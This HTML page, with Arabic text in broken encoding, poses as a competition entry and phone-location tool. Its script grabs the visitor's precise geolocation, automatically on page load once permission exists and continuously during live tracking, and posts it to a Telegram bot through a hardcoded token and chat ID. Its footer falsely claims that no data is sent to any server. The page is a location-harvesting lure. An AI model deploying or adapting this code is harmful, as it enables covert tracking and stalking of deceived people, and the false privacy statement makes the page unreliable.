<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Ø¯Ø®ÙˆÙ„Ùƒ Ø§Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ù‡</title>
  <!-- Leaflet CSS -->
  <link
    rel="stylesheet"
    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
    integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
    crossorigin=""
  />
  <style>
    :root { --bg:#0b1220; --fg:#e7edf7; --muted:#96a1b0; --card:#121a2a; --accent:#4da3ff; }
    * { box-sizing: border-box; }
    body { margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, "Noto Naskh Arabic UI", Arial, sans-serif; background:var(--bg); color:var(--fg); }
    header { padding: 18px 16px; border-bottom: 1px solid #22304a; position: sticky; top:0; background: linear-gradient(180deg, #0b1220 0%, #0b1220cc 100%); backdrop-filter: blur(6px); z-index: 1000; }
    h1 { margin: 0; font-size: 20px; }
    .container { padding: 16px; display: grid; gap: 16px; grid-template-columns: 1fr; max-width: 1100px; margin: 0 auto; }
    .card { background: var(--card); border: 1px solid #1c2840; border-radius: 16px; padding: 16px; box-shadow: 0 10px 30px #00000033; }
    .row { display: grid; gap: 12px; grid-template-columns: 1fr; }
    .controls { display: flex; flex-wrap: wrap; gap: 8px; }
    button, .btn { cursor: pointer; border: 1px solid #275082; background: #16243a; color: var(--fg); padding: 10px 14px; border-radius: 999px; font-weight: 600; transition: transform .06s ease, background .2s ease; }
    button:hover { background: #1c2f4d; }
    button:active { transform: scale(0.98); }
    .btn-primary { background: #1c4b8e; border-color: #2a6ac8; }
    .btn-secondary { background: #151f33; border-color: #2a3652; }
    .hint { color: var(--muted); font-size: 13px; }
    .kv { display:grid; grid-template-columns: auto 1fr; gap: 6px 12px; font-size: 14px; }
    .kv div:nth-child(odd){ color: var(--muted); }
    #map { width: 100%; height: 55vh; border-radius: 16px; border: 1px solid #1c2840; }
    .badge { display:inline-flex; align-items:center; gap:6px; background:#0f1b30; border:1px solid #203252; color:#cfe3ff; padding:6px 10px; border-radius:999px; font-size:12px; }
    .ok { color:#7dffa0; }
    .warn { color:#ffd36e; }
    .err { color:#ff8c8c; }
    footer { text-align:center; color: #7d8aa3; padding: 10px 0 18px; font-size: 12px; }
    @media (min-width: 880px){ .row { grid-template-columns: 1.1fr .9fr; } }
    #permissionRequest { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 18, 32, 0.95); display: flex; justify-content: center; align-items: center; z-index: 2000; }
    .permission-box { background: var(--card); padding: 24px; border-radius: 16px; max-width: 500px; text-align: center; border: 1px solid #2a3c5c; }
    .permission-title { font-size: 20px; margin-bottom: 16px; color: #4da3ff; }
    .permission-text { margin-bottom: 24px; line-height: 1.6; }
    .permission-btn { background: #1c4b8e; border: none; padding: 12px 24px; font-size: 16px; margin: 8px; }
    .permission-list { text-align: right; margin: 20px 0; padding: 0 20px; }
    .permission-list li { margin-bottom: 10px; }
    .consent-text { font-size: 12px; color: var(--muted); margin-top: 20px; }
  </style>
</head>
<body>
  <div id="permissionRequest">
    <div class="permission-box">
      <div class="permission-title">ğŸ“ ØªÙØ¹ÙŠÙ„ Ø®Ø¯Ù…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹</div>
      <div class="permission-text">
        Ù„ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ Ø¨Ø¯Ù‚Ø©ØŒ Ù†Ø­ØªØ§Ø¬ Ø¥Ù„Ù‰ Ø¥Ø°Ù†Ùƒ Ù„Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰:
        <ul class="permission-list">
          <li>Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù„Ø¬Ù‡Ø§Ø²Ùƒ</li>
          <li>ØªÙØ¹ÙŠÙ„ Ø¥Ø¹Ø¯Ø§Ø¯ "Ø¯Ù‚Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ"</li>
          <li>Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø£Ø«Ù†Ø§Ø¡ ØªØµÙØ­Ùƒ</li>
        </ul>
        Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹Ùƒ Ø¥Ù„Ù‰ Telegram Ø¨Ø¹Ø¯ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„ÙŠÙ‡.
      </div>
      <button id="requestPermissionBtn" class="btn-primary permission-btn">Ù…ÙˆØ§ÙÙ‚ ÙˆØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒÙ„</button>
      <div class="consent-text">Ø¨Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ "Ù…ÙˆØ§ÙÙ‚"ØŒ ÙØ¥Ù†Ùƒ ØªÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ ÙˆÙÙ‚Ù‹Ø§ Ù„Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ©.</div>
    </div>
  </div>

  <header>
    <h1>ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù‡Ø§ØªÙ Ø¨Ø¯Ù‚Ø© Ø¹Ø¨Ø± Ø§Ù„Ù…ØªØµÙØ­</h1>
  </header>

  <div class="container">
    <section class="card row">
      <div>
        <div class="controls" style="margin-bottom:12px;">
          <button id="locateBtn" class="btn-primary">ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¢Ù†</button>
          <button class="btn btn-secondary" id="toggleWatchBtn">Ø¨Ø¯Ø¡ Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±</button>
          <button class="btn btn-secondary" id="copyBtn">Ù†Ø³Ø® Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª</button>
          <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">ÙØªØ­ ÙÙŠ Ø®Ø±Ø§Ø¦Ø· Ø¬ÙˆØ¬Ù„</a>
        </div>
        <div class="hint">ÙŠØªØ·Ù„Ø¨ Ø§ØªØµØ§Ù„Ø§Ù‹ Ø¢Ù…Ù†Ø§Ù‹ (HTTPS) Ø£Ùˆ <span dir="ltr">http://localhost</span>ØŒ ÙˆÙ…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¹Ù„Ù‰ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¹Ù„Ù‰ Ø§Ù„Ù…ØªØµÙØ­.</div>
        <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
          <span class="badge" id="secureBadge">Ø§Ù„Ù…Ù†Ø´Ø£ Ø§Ù„Ø¢Ù…Ù†: â€”</span>
          <span class="badge" id="permBadge">Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹: â€”</span>
          <span class="badge" id="sensorBadge">Ø§Ù„Ù…Ø³ØªØ´Ø¹Ø±Ø§Øª Ø§Ù„Ø¹Ø§Ù„ÙŠØ©: Ù…ÙÙØ¹Ù‘Ù„</span>
        </div>
        <div class="kv" style="margin-top:12px;">
          <div>Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶ (lat):</div><div id="lat">â€”</div>
          <div>Ø®Ø· Ø§Ù„Ø·ÙˆÙ„ (lng):</div><div id="lng">â€”</div>
          <div>Ø§Ù„Ø¯Ù‚Ø© (Ù…ØªØ±):</div><div id="accuracy">â€”</div>
          <div>Ø§Ù„Ø§Ø±ØªÙØ§Ø¹ (Ù…ØªØ±):</div><div id="altitude">â€”</div>
          <div>Ø¯Ù‚Ø© Ø§Ù„Ø§Ø±ØªÙØ§Ø¹ (Ù…ØªØ±):</div><div id="altAcc">â€”</div>
          <div>Ø§Ù„Ø§ØªØ¬Ø§Ù‡ (headingÂ°):</div><div id="heading">â€”</div>
          <div>Ø§Ù„Ø³Ø±Ø¹Ø© (Ù…/Ø«):</div><div id="speed">â€”</div>
          <div>Ø¢Ø®Ø± ØªØ­Ø¯ÙŠØ«:</div><div id="timestamp">â€”</div>
        </div>
        <p class="hint" style="margin-top:8px;">Ù†ØµÙŠØ­Ø© Ù„Ù„Ø¯Ù‚Ø© Ø§Ù„Ø¹Ø§Ù„ÙŠØ©: ÙØ¹Ù‘Ù„ GPSØŒ Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«ØŒ ÙˆØ§Ù„Ù€ Wiâ€‘FiØ› ÙˆØ§Ø¨Ù‚Ù ÙÙŠ Ù…ÙƒØ§Ù† Ù…ÙØªÙˆØ­ Ø¥Ù† Ø£Ù…ÙƒÙ†.</p>
      </div>
      <div>
        <div id="map"></div>
      </div>
    </section>

    <section class="card">
      <details>
        <summary><strong>Ø§Ù„Ø®ÙŠØ§Ø±Ø§Øª Ø§Ù„Ù…ØªÙ‚Ø¯Ù…Ø©</strong></summary>
        <div style="margin-top:10px; display:grid; gap:8px;">
          <label style="display:flex; align-items:center; gap:8px;">
            <input type="checkbox" id="hiAcc" checked />
            Ø§Ø³ØªØ®Ø¯Ø§Ù… <code>enableHighAccuracy</code>
          </label>
          <label style="display:flex; align-items:center; gap:8px;">
            <input type="number" id="timeout" value="15000" min="0" step="1000" style="max-width:140px;" />
            Ù…Ù‡Ù„Ø© Ø§Ù„Ø·Ù„Ø¨ (ms)
          </label>
          <label style="display:flex; align-items:center; gap:8px;">
            <input type="number" id="maxAge" value="0" min="0" step="1000" style="max-width:140px;" />
            Ø£Ù‚ØµÙ‰ Ø¹Ù…Ø± Ù„Ù„Ù‚Ø±Ø§Ø¡Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ø´ (ms)
          </label>
        </div>
      </details>
    </section>
  </div>

  <footer>Â© ØªØ¬Ø±Ø¨Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø§Ù„Ù…ØªØµÙØ­ â€” Ù„Ø§ ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ù„Ø£ÙŠ Ø®Ø§Ø¯Ù… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…Ù„Ù.</footer>

  <!-- Leaflet JS -->
  <script
    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
    integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
    crossorigin=""
  ></script>
  <script>
    // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
    const TELEGRAM_CHAT_ID = "6837315281";

    async function sendToTelegram(lat, lng, accuracy) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const text = `Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯:\nğŸ“ https://maps.google.com/?q=${lat},${lng}\nØ®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat}\nØ®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lng}\nØ§Ù„Ø¯Ù‚Ø©: ${accuracy}m`;
      try {
        await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
        });
      } catch (e) {
        console.error("ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…", e);
      }
    }

    // Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙˆØ§Ø¬Ù‡Ø©
    const el = (id) => document.getElementById(id);
    const latEl = el('lat');
    const lngEl = el('lng');
    const accEl = el('accuracy');
    const altEl = el('altitude');
    const altAccEl = el('altAcc');
    const headEl = el('heading');
    const speedEl = el('speed');
    const timeEl = el('timestamp');
    const secureBadge = el('secureBadge');
    const permBadge = el('permBadge');
    const sensorBadge = el('sensorBadge');
    const permissionRequest = el('permissionRequest');

    const hiAcc = el('hiAcc');
    const timeout = el('timeout');
    const maxAge = el('maxAge');

    const locateBtn = el('locateBtn');
    const toggleWatchBtn = el('toggleWatchBtn');
    const copyBtn = el('copyBtn');
    const mapsBtn = el('mapsBtn');
    const requestPermissionBtn = el('requestPermissionBtn');

    let watchId = null;
    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    secureBadge.textContent = `Ø§Ù„Ù…Ù†Ø´Ø£ Ø§Ù„Ø¢Ù…Ù†: ${isSecure ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'}`;
    secureBadge.classList.add(isSecure ? 'ok' : 'warn');

    let map = L.map('map', { zoomControl: true });
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution: '&copy; OpenStreetMap contributors' }).addTo(map);
    let marker = null, circle = null;

    function updateMap(lat, lng, accuracy) {
      const pos = [lat, lng];
      if (!marker) marker = L.marker(pos).addTo(map);
      else marker.setLatLng(pos);
      if (!circle) circle = L.circle(pos, { radius: accuracy || 30 }).addTo(map);
      else { circle.setLatLng(pos); circle.setRadius(accuracy || 30); }
      map.setView(pos, 17);
    }

    function fmt(n) { return (n === null || n === undefined) ? 'â€”' : Number(n).toFixed(6); }

    function showPosition(position) {
      permissionRequest.style.display = 'none';
      
      const c = position.coords;
      latEl.textContent = fmt(c.latitude);
      lngEl.textContent = fmt(c.longitude);
      accEl.textContent = c.accuracy ? `${Math.round(c.accuracy)} m` : 'â€”';
      altEl.textContent = c.altitude != null ? `${Math.round(c.altitude)} m` : 'â€”';
      altAccEl.textContent = c.altitudeAccuracy != null ? `${Math.round(c.altitudeAccuracy)} m` : 'â€”';
      headEl.textContent = c.heading != null && !isNaN(c.heading) ? `${Math.round(c.heading)}Â°` : 'â€”';
      speedEl.textContent = c.speed != null ? `${(c.speed).toFixed(2)} m/s` : 'â€”';
      timeEl.textContent = new Date(position.timestamp).toLocaleString();

      updateMap(c.latitude, c.longitude, c.accuracy || 30);
      mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
      sendToTelegram(c.latitude, c.longitude, Math.round(c.accuracy || 0));
    }

    function showError(err) {
      const msgs = {
        1: 'Ø§Ù…Ù†Ø­ Ø§Ù„Ø§Ø°Ù† Ù„Ø¯Ø®ÙˆÙ„Ùƒ Ø§Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ù‡ .',
        2: 'Ø§Ù…Ù†Ø­ Ø§Ù„Ø§Ø°Ù† Ù„Ø¯Ø®ÙˆÙ„Ùƒ Ø§Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ù‡.',
        3: 'Ø§Ù…Ù†Ø­ Ø§Ù„Ø§Ø°Ù† Ù„Ø¯Ø®ÙˆÙ„Ùƒ Ø§Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø¨Ù‚Ù‡.'
      };
      
      // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø®Ø·Ø£ Ù‡Ùˆ Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†ØŒ Ø§Ø¹Ø±Ø¶ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
      if (err.code === 1) {
        permissionRequest.style.display = 'flex';
      } else {
        alert(msgs[err.code] || ('Ø®Ø·Ø£ ØºÙŠØ± Ù…ØªÙˆÙ‚Ø¹: ' + err.message));
      }
    }

    function buildOptions(){
      return { 
        enableHighAccuracy: hiAcc.checked, 
        timeout: Number(timeout.value)||15000, 
        maximumAge: Number(maxAge.value)||0 
      };
    }

    function getOnce(){
      if(!('geolocation' in navigator)){ 
        alert('Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Geolocation'); 
        return; 
      }
      
      if (!isSecure) {
        alert('Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø© ØºÙŠØ± Ø¢Ù…Ù†Ø©. ÙŠÙ„Ø²Ù… Ø§ØªØµØ§Ù„ HTTPS Ø£Ùˆ localhost Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹.');
        return;
      }
      
      navigator.geolocation.getCurrentPosition(showPosition, showError, buildOptions());
    }

    function toggleWatch(){
      if(!('geolocation' in navigator)){ 
        alert('Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Geolocation'); 
        return; 
      }
      
      if(watchId != null){ 
        navigator.geolocation.clearWatch(watchId); 
        watchId=null; 
        toggleWatchBtn.textContent='Ø¨Ø¯Ø¡ Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±'; 
      } else { 
        watchId = navigator.geolocation.watchPosition(showPosition, showError, buildOptions()); 
        toggleWatchBtn.textContent='Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØªØ¨Ø¹ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±'; 
      }
    }

    copyBtn.addEventListener('click', async ()=>{
      const lat = latEl.textContent, lng = lngEl.textContent;
      if(!lat || lat==='â€”'){ 
        alert('Ù„Ù… ÙŠØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø¹Ø¯.'); 
        return; 
      }
      const txt = `${lat},${lng}`;
      try{ 
        await navigator.clipboard.writeText(txt); 
        alert('ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: ' + txt); 
      } catch{ 
        alert('ØªØ¹Ø°Ø± Ø§Ù„Ù†Ø³Ø® ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹Ø› Ø§Ù†Ø³Ø®Ù‡Ø§ ÙŠØ¯ÙˆÙŠØ§Ù‹: ' + txt); 
      }
    });

    locateBtn.addEventListener('click', getOnce);
    toggleWatchBtn.addEventListener('click', toggleWatch);
    requestPermissionBtn.addEventListener('click', getOnce);

    async function refreshPermission(){
      try{
        if(!('permissions' in navigator)){ 
          permBadge.textContent='Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹: ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…'; 
          permBadge.classList.add('warn'); 
          return; 
        }
        
        const status = await navigator.permissions.query({ name: 'geolocation' });
        const mapStatus = {'granted':'Ù…Ù…Ù†ÙˆØ­','prompt':'ÙŠØ­ØªØ§Ø¬ Ù…ÙˆØ§ÙÙ‚Ø©','denied':'Ù…Ø±ÙÙˆØ¶'};
        permBadge.textContent=`Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${mapStatus[status.state]||status.state}`;
        permBadge.classList.remove('ok','warn','err');
        
        if (status.state === 'granted') {
          permBadge.classList.add('ok');
          permissionRequest.style.display = 'none';
          // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥Ø°Ù† Ù…Ù…Ù†ÙˆØ­Ù‹Ø§ØŒ Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
          getOnce();
        } else if (status.state === 'prompt') {
          permBadge.classList.add('warn');
          permissionRequest.style.display = 'flex';
        } else {
          permBadge.classList.add('err');
          permissionRequest.style.display = 'flex';
        }
        
        status.onchange = refreshPermission;
      } catch(e){ 
        permBadge.textContent='Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹: â€”'; 
        permBadge.classList.add('warn'); 
      }
    }

    // ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ø®Ø±ÙŠØ·Ø© Ø¨Ù‚ÙŠÙ…Ø© Ø§ÙØªØ±Ø§Ø¶ÙŠØ©
    map.setView([15.3694, 44.1910], 6); // Ø§Ù„ÙŠÙ…Ù† ÙƒØ§ÙØªØ±Ø§Ø¶ÙŠ

    // Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©ØŒ ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø¥Ø°Ù†
    window.addEventListener('load', ()=>{
      refreshPermission();
      
      // Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† Ø§Ù„Ù…Ù†Ø´Ø£ Ø¢Ù…Ù†Ø§Ù‹ØŒ Ø£Ø®Ù Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù† ÙˆØ£Ø¸Ù‡Ø± ØªØ­Ø°ÙŠØ±Ø§Ù‹
      if (!isSecure) {
        permissionRequest.style.display = 'none';
        secureBadge.textContent = 'Ø§Ù„Ù…Ù†Ø´Ø£ Ø§Ù„Ø¢Ù…Ù†: Ù„Ø§ (HTTPS Ù…Ø·Ù„ÙˆØ¨)';
        secureBadge.classList.add('err');
      }
    });
  </script>
</body>
</html>
